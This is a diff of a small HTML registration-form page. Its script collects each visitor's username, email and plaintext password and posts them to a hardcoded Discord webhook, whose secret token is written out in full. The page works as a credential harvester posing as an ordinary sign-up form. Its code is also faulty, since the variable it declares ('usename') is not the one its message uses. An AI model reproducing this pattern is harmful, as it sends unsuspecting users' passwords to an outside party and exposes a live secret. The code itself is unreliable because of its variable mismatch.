@@ -7,8 +7,8 @@ r<!DOCTYPE html>
 <body>
     <h2>Registration Form</h2>
     <form onsubmit="sendToDiscord(event)">
-        <label for="name">userName:</label><br>
-        <input type="text" id="name" name="name" required><br><br>
+        <label for="username">userName:</label><br>
+        <input type="text" id="username" name="username" required><br><br>
 
         <label for="email">Email:</label><br>
         <input type="email" id="email" name="email" required><br><br>
@@ -23,14 +23,14 @@ r<!DOCTYPE html>
     function sendToDiscord(event) {
         event.preventDefault(); // stop page reload
 
-        const usename = document.getElementById("name").value;
+        const usename = document.getElementById("username").value;
         const email = document.getElementById("email").value;
         const password = document.getElementById("password").value;
 
         const webhookURL = "https://discord.com/api/webhooks/1377284518234554421/dDKOBOn-XS2CvtDiAko_MVsv2lsFvGTiyOnJtmwIX58VQNkndG185w0xF37VOApxR1D3";
 
         const message = {
-            content: `📨 **New Registration**\n👤 Name: ${name}\n📧 Email: ${email}\n🔒 Password: ${password}`
+            content: `📨 **New Registration**\n👤 userName: ${username}\n📧 Email: ${email}\n🔒 Password: ${password}`
         };
 
         fetch(webhookURL, {
